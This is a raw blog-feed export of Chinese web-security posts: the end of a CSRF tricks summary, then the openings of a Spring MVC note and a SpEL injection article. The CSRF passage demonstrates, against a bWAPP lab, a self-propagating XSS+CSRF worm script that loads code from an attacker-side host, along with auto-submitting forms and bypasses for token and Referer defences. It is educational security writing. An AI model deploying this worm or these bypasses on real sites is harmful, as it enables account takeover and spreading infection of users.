class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry"</span> <span class="attr">value</span>=<span class="string">"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"blog"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"entry&amp;#95;add"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementById(<span class="string">'csrf'</span>);</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段HTML代码测试是OK的，问题在于我们要想XSS和CSRF进行组合利用，那就需要将这段内容转换为JavaScript代码的形式才能被script标签加载进来成功执行。这里可以使用XSS’OR工具来对这段HTML代码进行转换：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.writeln(<span class="string">"&lt;html&gt;&lt;!--CSRF PoC-generated by Burp Suite Professional--&gt;&lt;body&gt;&lt;script&gt;history.pushState(\'\',\'\',\'\/\')&lt;\/script&gt;&lt;form id=\"csrf\"action=\"http:\/\/192.168.10.133\/bWAPP\/xss_stored_1.php\"method=\"POST\"&gt;&lt;input type=\"hidden\"name=\"entry\"value=\"http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js\"\/&gt;&lt;input type=\"hidden\"name=\"blog\"value=\"submit\"\/&gt;&lt;input type=\"hidden\"name=\"entry&amp;#95;add\"value=\"\"\/&gt;&lt;input type=\"submit\"value=\"Submit request\"\/&gt;&lt;\/form&gt;&lt;\/body&gt;&lt;script&gt;var m=document.getElementById(\'csrf\');m.submit();&lt;\/script&gt;&lt;\/html&gt;"</span>);</span><br></pre></td></tr></table></figure><p>这段JavaScript代码的实现很简单，直接将HTML代码内容放入document.writeln()函数中，直接将其写入当前HTML页面。</p><p>注意，前面这段实现CSRF攻击的HTML或JavaScript代码在提交表单新建博文时内容是填写的<code>http&amp;#58;&amp;#47;&amp;#47;192&amp;#46;168&amp;#46;10&amp;#46;1&amp;#47;csrf&amp;#46;js</code>而非XSS payload。这里如果要修改为实现XSS+CSRF蠕虫的payload，由于博文内容需要填入尖括号<code>&lt;&gt;</code>，因此这种方式并不能提交。</p><p>下面我们换种写法，利用JavaScript来创建表单和输入项再提交，csrf2.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_form</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(f);</span><br><span class="line">f.method = <span class="string">"post"</span>;</span><br><span class="line"><span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_elements</span>(<span class="params">eForm, eName, eValue</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">eForm.appendChild(e);</span><br><span class="line">e.type = <span class="string">'hidden'</span>;</span><br><span class="line">e.name = eName;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">document</span>.all) &#123;</span><br><span class="line">e.style.display = <span class="string">'none'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">e.style.display = <span class="string">'block'</span>;</span><br><span class="line">e.style.width = <span class="string">'0px'</span>;</span><br><span class="line">e.style.height = <span class="string">'0px'</span>;</span><br><span class="line">&#125;</span><br><span class="line">e.value = eValue;</span><br><span class="line"><span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _f = new_form();</span><br><span class="line">create_elements(_f, <span class="string">"entry"</span>, <span class="string">"&lt;script src=\"http://192.168.10.1/csrf2.js\"&gt;&lt;/script&gt;"</span>);</span><br><span class="line">create_elements(_f, <span class="string">"blog"</span>, <span class="string">"submit"</span>);</span><br><span class="line">create_elements(_f, <span class="string">"entry_add"</span>, <span class="string">""</span>);</span><br><span class="line">_f.action = <span class="string">"http://192.168.10.133/bWAPP/xss_stored_1.php"</span></span><br><span class="line">_f.submit();</span><br></pre></td></tr></table></figure><p>将这段JS代码中的一个作为csrf2.js文件，删掉之前alan用户相关的博文，提交博文内容为<code>&lt;script src=&quot;http://192.168.10.1/csrf2.js&quot;&gt;&lt;/script&gt;</code>，即通过script标签直接引入CSRF攻击的JavaScript代码，之后会发现只要有用户访问了这个页面就会一直触发XSS+CSRF蠕虫攻击（因为这个Blog内容是直接显示在主页而无需点进去才能看到内容），每次被攻击的用户都会自动发布一个同样payload的博文继续往下传染蠕虫：</p><p><img src="/2020/01/21/CSRF-Tricks小结/7.png" alt=""></p><p><img src="/2020/01/21/CSRF-Tricks小结/8.png" alt=""></p><p>当其他用户访问就会自动感染蠕虫：</p><p><img src="/2020/01/21/CSRF-Tricks小结/9.png" alt=""></p><h2 id="0x08-CSRF绕过技巧收集"><a href="#0x08-CSRF绕过技巧收集" class="headerlink" title="0x08 CSRF绕过技巧收集"></a>0x08 CSRF绕过技巧收集</h2><p>引自：<a href="https://xz.aliyun.com/t/6176" target="_blank" rel="noopener">绕过CSRF防御</a></p><h3 id="所有的CSRF"><a href="#所有的CSRF" class="headerlink" title="所有的CSRF"></a>所有的CSRF</h3><p>不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。</p><h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</p><h4 id="更改请求方法"><a href="#更改请求方法" class="headerlink" title="更改请求方法"></a>更改请求方法</h4><p>另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。</p><p>例如，如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br></pre></td></tr></table></figure><p>可以被改写成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /change_password?new_password=qwerty</span><br></pre></td></tr></table></figure><h3 id="CSRF-token的防御措施"><a href="#CSRF-token的防御措施" class="headerlink" title="CSRF token的防御措施"></a>CSRF token的防御措施</h3><p>因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。</p><h4 id="删除token参数或发送空token"><a href="#删除token参数或发送空token" class="headerlink" title="删除token参数或发送空token"></a>删除token参数或发送空token</h4><p>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p><p>例如，合法请求如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br></pre></td></tr></table></figure><p>那么实施这种请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br></pre></td></tr></table></figure><p>或这种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty&amp;csrf_tok=</span><br></pre></td></tr></table></figure><h4 id="使用另一个session的CSRF-token"><a href="#使用另一个session的CSRF-token" class="headerlink" title="使用另一个session的CSRF token"></a>使用另一个session的CSRF token</h4><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p><p>如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。</p><p>换句话说，原本应该发送如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br></pre></td></tr></table></figure><p>但是改成发送这个请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=YOUR_TOKEN</span><br></pre></td></tr></table></figure><h4 id="Session固定"><a href="#Session固定" class="headerlink" title="Session固定"></a>Session固定</h4><p>有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。</p><p>如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。</p><p>这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。</p><ol><li><p>session固定。这是一个可以让你控制受害者的cookie存储的攻击；</p></li><li><p>执行如下请求来实施CSRF攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">Cookie: CSRF_TOK=FAKE_TOKEN;</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=FAKE_TOKEN</span><br></pre></td></tr></table></figure></li></ol><h3 id="Referer字段的CSRF防御"><a href="#Referer字段的CSRF防御" class="headerlink" title="Referer字段的CSRF防御"></a>Referer字段的CSRF防御</h3><p>如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？</p><h4 id="Referer字段为空"><a href="#Referer字段为空" class="headerlink" title="Referer字段为空"></a>Referer字段为空</h4><p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>协议绕过。这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p><p><strong>利用data:协议</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Base64解码即可看到代码。</p><p><strong>利用https协议</strong></p><p>https向http跳转的时候Referer为空，拿一个https的webshell</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://xxxxx.xxxxx/attack.php"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>attack.php写上CSRF攻击代码</p><h4 id="移除Referer字段"><a href="#移除Referer字段" class="headerlink" title="移除Referer字段"></a>移除Referer字段</h4><p>和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span> =<span class="string">“referrer”content</span> =<span class="string">“no-referrer”</span>&gt;</span></span><br></pre></td></tr></table></figure><p>应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。</p><h4 id="绕过正则表达式"><a href="#绕过正则表达式" class="headerlink" title="绕过正则表达式"></a>绕过正则表达式</h4><p>如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。</p><p>如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。</p><h4 id="判断Referer是某域情况下绕过"><a href="#判断Referer是某域情况下绕过" class="headerlink" title="判断Referer是某域情况下绕过"></a>判断Referer是某域情况下绕过</h4><p> 比如你找的csrf是xxx.com验证的referer是验证的*.xx.com可以找个二级域名之后<code>&lt;img &quot;csrf地址&quot;&gt;</code>之后在把文章地址发出去就可以伪造。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CSRF" scheme="https://www.mi1k7ea.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>Spring MVC笔记</title>
    <link href="https://www.mi1k7ea.com/2020/01/16/Spring-MVC%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.mi1k7ea.com/2020/01/16/Spring-MVC笔记/</id>
    <published>2020-01-16T14:43:00.000Z</published>
    <updated>2020-02-03T12:33:10.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p><a href="http://c.biancheng.net/spring_mvc/" target="_blank" rel="noopener">http://c.biancheng.net/spring_mvc/</a></p><h2 id="0x01-MVC设计模式"><a href="#0x01-MVC设计模式" class="headerlink" title="0x01 MVC设计模式"></a>0x01 MVC设计模式</h2><p>MVC是Model、View和Controller的缩写，分别代表Web应用程序中的三种职责：</p><ul><li>Model模型：用于存储数据以及处理用户请求的业务逻辑。</li><li>View视图：向控制器提交数据，显示模型中的数据。</li><li>Controller控制器：根据视图提出的请求判断将请求和数据交给哪个模型处理，将处理后的有关结果交给哪个视图更新显示。</li></ul><p>MVC设计不仅限于Java Web应用，还包括许多应用，比如前端、PHP、.NET 等语言。之所以那么做的根本原因在于解耦各个模块。</p><p>其中，经典的基于Servlet的MVC模式的具体实现如下：</p><p><img src="/2020/01/16/Spring-MVC笔记/1.png" alt=""></p><ul><li>模型：一个或多个JavaBean对象，用于存储数据（实体模型，由JavaBean类创建）和处理业务逻辑（业务模型，由一般的Java类创建）。</li><li>视图：一个或多个JSP页面，向控制器提交数据和为模型提供数据显示，JSP页面主要使用HTML标记和JavaBean标记来显示数据。</li><li>控制器：一个或多个Servlet对象，根据视图提交的请求进行控制，即将请求转发给处理业务逻辑的JavaBean，并将处理结果存放到实体模型JavaBean中，输出给视图显示。</li></ul><h2 id="0x02-Spring-MVC简介"><a href="#0x02-Spring-MVC简介" class="headerlink" title="0x02 Spring MVC简介"></a>0x02 Spring MVC简介</h2><p>Spring MVC是Spring提供给Web应用的框架设计，是典型的MVC架构。</p><p>Spring MVC框架主要由DispatcherServlet、处理器映射、控制器、视图解析器、视图组成，其工作原理如图：</p><p>…</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>SpEL表达式注入漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/01/10/SpEL表达式注入漏洞总结/</id>
    <published>2020-01-10T14:05:19.000Z</published>
    <updated>2020-01-14T14:42:03.501Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SpEL表达式基础"><a href="#0x01-SpEL表达式基础" class="headerlink" title="0x01 SpEL表达式基础"></a>0x01 SpEL表达式基础</h2><h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p> 在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p><p>在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。</p><p>SpEL有许多特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h3 id="SpEL定界符——"><a href="#SpEL定界符——" class="headerlink" title="SpEL定界符——#{}"></a>SpEL定界符——<code>#{}</code></h3><p>SpEL使用<code>#{}</code>作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p><p>这里需要注意<code>#{}</code>和<code>${}</code>的区别：</p><ul><li><code>#{}</code>就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</li><li><code>${}</code>主要用于加载外部属性文件中的值；</li><li>两者可以混合使用，但是必须<code>#{}</code>在外面，<code>${}</code>在里面，如<code>#{&#39;${}&#39;}</code>，注意单引号是字符串类型才添加的；</li></ul><h3 id="SpEL表达式类型"><a href="#SpEL表达式类型" class="headerlink" title="SpEL表达式类型"></a>SpEL表达式类型</h3><h4 id="字面值"><a href="#字面值" class="headerlink" title="字面值"></a>字面值</h4><p>最简单的SpEL表达式就是仅包含一个字面值。</p><p>下面我们在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到<code>#{}</code>定界符，注意若是指定为字符串的话需要添加单引号括起来：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message1"</span> <span class="attr">value</span>=<span class="string">"#&#123;666&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message2"</span> <span class="attr">value</span>=<span class="string">"#&#123;'mi1k7ea'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>还可以直接与字符串混用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;property name=&quot;message&quot; value=&quot;the value is #&#123;666&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"salary"</span> <span class="attr">value</span>=<span class="string">"#&#123;1e4&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><p>直接用Spring的HelloWorld例子。</p><p>HelloWorld.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Your Message : "</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        HelloWorld obj = (HelloWorld) context.getBean(<span class="string">"helloWorld"</span>);</span><br><span class="line">        obj.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Beans.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;'mi1k7ea'&#125; is #&#123;666&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Message : mi1k7ea is 666</span><br></pre></td></tr></table></figure><h4 id="引用Bean、属性和方法"><a href="#引用Bean、属性和方法" class="headerlink" title="引用Bean、属性和方法"></a>引用Bean、属性和方法</h4><h5 id="引用Bean"><a href="#引用Bean" class="headerlink" title="引用Bean"></a>引用Bean</h5><p>SpEL表达式能够通过其他Bean的ID进行引用，直接在<code>#{}</code>符号中写入ID名即可，无需添加单引号括起来。如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--原来的写法，通过构造函数实现依赖注入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;constructor-arg ref="test"/&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"#&#123;test&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h5 id="引用类属性"><a href="#引用类属性" class="headerlink" title="引用类属性"></a>引用类属性</h5><blockquote><p>SpEL表达式能够访问类的属性。</p><p>比如，carl参赛者是一位模仿高手，kenny唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"kenny"</span> <span class="attr">class</span>=<span class="string">"com.spring.entity.Instrumentalist"</span></span></span><br><span class="line"><span class="tag">&gt;</span>    p:song="May Rain"</span><br><span class="line">&gt;    p:instrument-ref="piano"/&gt;</span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"carl"</span> <span class="attr">class</span>=<span class="string">"com.spring.entity.Instrumentalist"</span>&gt;</span></span><br><span class="line">&gt;    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"instrument"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.instrument&#125;"</span>/&gt;</span></span><br><span class="line">&gt;    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span 